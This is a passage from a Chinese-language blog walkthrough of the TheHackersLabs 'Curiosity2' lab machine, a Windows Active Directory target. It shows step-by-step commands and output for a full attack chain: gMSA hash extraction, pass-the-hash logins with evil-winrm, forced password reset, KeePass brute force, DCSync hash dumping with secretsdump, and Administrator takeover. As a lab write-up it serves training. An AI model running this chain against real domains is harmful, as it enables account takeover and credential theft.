<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> download 20241203110607_BloodHound.zip
                                        
Info: Downloading C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token punctuation">\</span>20241203110607_BloodHound.zip to 20241203110607_BloodHound.zip
                                        
Info: Download successful<span class="token operator">!</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/12/03/OLFcbj.png" alt="OLFcbj.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/12/03/OLFYqY.png" alt="OLFYqY.png" loading="lazy"><br>Svc_Accounts对GMSA_SQL用户有ReadGMSAPassword权限，同时GMSA_SQL用户对toolsdb用户具有GenericWrite和ForceChangePassword权限，先拿到GMSA_SQL用户看看</p>
<pre class="language-none"><code class="language-none">此权限允许您读取组托管服务帐户 (GMSA) 的密码。组托管服务帐户是一种特殊类型的 Active Directory 对象，其中该对象的密码由域控制器管理并按设定的时间间隔自动更改（检查 MSDS-ManagedPasswordInterval 属性）。

GMSA 的预期用途是允许某些计算机帐户检索 GMSA 的密码，然后作为 GMSA 运行本地服务。控制授权主体的攻击者可能会滥用该特权来冒充 GMSA。
## ReadGMSAPassword</code></pre>
<p>利用文章<a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword">https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/gMSADumper-main<span class="token punctuation">]</span> ➜  python gMSADumper.py <span class="token parameter variable">-u</span> <span class="token string">'sqlsvc'</span> <span class="token parameter variable">-p</span> <span class="token string">'$PRING2021#'</span> <span class="token parameter variable">-d</span> <span class="token string">'cons.thl'</span>                                             <span class="token punctuation">[</span><span class="token number">18</span>:46:51<span class="token punctuation">]</span>
Users or <span class="token function">groups</span> <span class="token function">who</span> can <span class="token builtin class-name">read</span> password <span class="token keyword">for</span> GMSA_SQL$:
 <span class="token operator">></span> Svc_Accounts
GMSA_SQL$:::ec1f99b967f3f285007fd567cc203155
GMSA_SQL$:aes256-cts-hmac-sha1-96:9ef94f6fad53e1875f86734bfa278f22c89eff4a262d6939b3ce98c1ff7c4e03
GMSA_SQL$:aes128-cts-hmac-sha1-96:15a4c7dab46f700b97f0fdaf4484cf6d</code></pre>
<p>抓到GMSA_SQL用户的hash，可以直接用hash登录这个用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.31.207 <span class="token parameter variable">-u</span> <span class="token string">"GMSA_SQL$"</span> <span class="token parameter variable">-H</span> ec1f99b967f3f285007fd567cc203155                                                  <span class="token punctuation">[</span><span class="token number">18</span>:49:28<span class="token punctuation">]</span>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>GMSA_SQL$<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
cons<span class="token punctuation">\</span>gmsa_sql$</code></pre>
<p>然后去修改toolsdb的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>GMSA_SQL$<span class="token punctuation">\</span>Documents<span class="token operator">></span> Set-ADAccountPassword <span class="token parameter variable">-Identity</span> toolsdb <span class="token parameter variable">-NewPassword</span> <span class="token punctuation">(</span>ConvertTo-SecureString <span class="token string">"123456tAA@"</span> <span class="token parameter variable">-AsPlainText</span> -Force<span class="token punctuation">)</span> <span class="token parameter variable">-Reset</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.31.207 <span class="token parameter variable">-u</span> <span class="token string">"toolsdb"</span> <span class="token parameter variable">-p</span> <span class="token string">'123456tAA@'</span>                                                                           <span class="token punctuation">[</span><span class="token number">19</span>:02:21<span class="token punctuation">]</span>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>toolsdb<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
cons<span class="token punctuation">\</span>toolsdb</code></pre>
<p>拿到toolsdb的shell,然后通过这个用户进入toolsdb数据库查看,看一下有哪些表</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>toolsdb<span class="token punctuation">\</span>Documents<span class="token operator">></span> sqlcmd <span class="token parameter variable">-E</span> <span class="token parameter variable">-S</span> .<span class="token punctuation">\</span>SQLEXPRESS <span class="token parameter variable">-d</span> <span class="token string">"toolsdb"</span> <span class="token parameter variable">-Q</span> <span class="token string">"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"</span>
TABLE_NAME
--------------------------------------------------------------------------------------------------------------------------------
<span class="token function">users</span>

<span class="token punctuation">(</span><span class="token number">1</span> rows affected<span class="token punctuation">)</span></code></pre>
<p>查看表里内容</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>toolsdb<span class="token punctuation">\</span>Documents<span class="token operator">></span> sqlcmd <span class="token parameter variable">-E</span> <span class="token parameter variable">-S</span> .<span class="token punctuation">\</span>SQLEXPRESS <span class="token parameter variable">-d</span> <span class="token string">"toolsdb"</span> <span class="token parameter variable">-Q</span> <span class="token string">"select * from users"</span>
<span class="token function">id</span>          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          <span class="token number">1</span> user_6B482050                                      433129A1<span class="token operator">!</span>@1
          <span class="token number">2</span> user_47F7501A                                      64409A1C<span class="token operator">!</span>@1
          <span class="token number">3</span> user_515A0C58                                      CAD616E3<span class="token operator">!</span>@1
          <span class="token number">4</span> user_CA843BF2                                      731C60AD<span class="token operator">!</span>@1
          <span class="token number">5</span> user_AA2B9FF8                                      8E181E5F<span class="token operator">!</span>@1
          <span class="token number">6</span> user_F6E6A108                                      <span class="token number">47862562</span><span class="token operator">!</span>@1
          <span class="token number">7</span> user_8D56BAE8                                      425B6335<span class="token operator">!</span>@1
          <span class="token number">8</span> user_BA9B1295                                      E4FC1AC4<span class="token operator">!</span>@1
          <span class="token number">9</span> user_66B7DBEE                                      4EE216A3<span class="token operator">!</span>@1
         <span class="token number">10</span> user_E75B7C23                                      4CD89A92<span class="token operator">!</span>@1

<span class="token punctuation">(</span><span class="token number">10</span> rows affected<span class="token punctuation">)</span></code></pre>
<p>拿到了一些用户和密码，猜测是用来打开keepass数据库的，提取一下密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> pass <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $3&#125;'</span> <span class="token operator">></span> pass
root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> pass                                                                                                                            <span class="token punctuation">[</span><span class="token number">19</span>:22:08<span class="token punctuation">]</span>
433129A1<span class="token operator">!</span>@1
64409A1C<span class="token operator">!</span>@1
CAD616E3<span class="token operator">!</span>@1
731C60AD<span class="token operator">!</span>@1
8E181E5F<span class="token operator">!</span>@1
<span class="token number">47862562</span><span class="token operator">!</span>@1
425B6335<span class="token operator">!</span>@1
E4FC1AC4<span class="token operator">!</span>@1
4EE216A3<span class="token operator">!</span>@1
4CD89A92<span class="token operator">!</span>@1</code></pre>
<h2 id="keepass爆破"><a href="#keepass爆破" class="headerlink" title="keepass爆破"></a>keepass爆破</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/keepass4brute<span class="token punctuation">]</span> git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ➜  ./keepass4brute.sh /tmp/Database.kdbx /tmp/pass                                                  <span class="token punctuation">[</span><span class="token number">19</span>:30:18<span class="token punctuation">]</span>
keepass4brute <span class="token number">1.3</span> by r3nt0n
https://github.com/r3nt0n/keepass4brute

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Words tested: <span class="token number">5</span>/10 - Attempts per minute: <span class="token number">0</span> - Estimated <span class="token function">time</span> remaining: Calculating<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Current attempt: 8E181E5F<span class="token operator">!</span>@1

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Password found: 8E181E5F<span class="token operator">!</span>@1</code></pre>
<p>爆破拿到密码<code>8E181E5F!@1</code><br><img src="https://ooo.0x0.ooo/2024/12/03/OLFYqY.png" alt="OLFYqY.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/12/03/OLF9Cc.png" alt="OLF9Cc.png" loading="lazy"><br>拿到一组用户名密码<code>msol:YRax2Ry8g2ITQ3hpRPze</code>，但是winrm连不上，看一下这个用户有什么权限<br><img src="https://ooo.0x0.ooo/2024/12/03/OLF2nr.png" alt="OLF2nr.png" loading="lazy"><br>DCSync!有了</p>
<h2 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h2><p>直接dump一下哈希</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  secretsdump.py  WIN-C73PROQLRHL.cons.thl/msol@192.168.31.207                                                                     <span class="token punctuation">[</span><span class="token number">19</span>:40:34<span class="token punctuation">]</span>
Impacket v0.10.0 - Copyright <span class="token number">2022</span> SecureAuth Corporation

Password:
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a6c4014f622dcadd4ec24cec540aaa86:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre>
<p>PTH登录带走</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.31.207 <span class="token parameter variable">-u</span> <span class="token string">"administrator"</span> <span class="token parameter variable">-H</span> <span class="token string">'5d48bcf84aea999fb1ade06970a81237'</span>                                            <span class="token punctuation">[</span><span class="token number">19</span>:42:59<span class="token punctuation">]</span>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
cons<span class="token punctuation">\</span>administrator</code></pre>
<p>下一位。</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/e965f5ec/" title="thehackerslabs-Curiosity2">https://tao0845.github.io/posts/e965f5ec/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/83be2f6e/" rel="prev" title="第九章-blueteam 的小心思"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">第九章-blueteam 的小心思</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/a8a9f8e9/" rel="next" title="thehackerslabs-Doraemon"><span class="post-nav-text">thehackerslabs-Doraemon</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>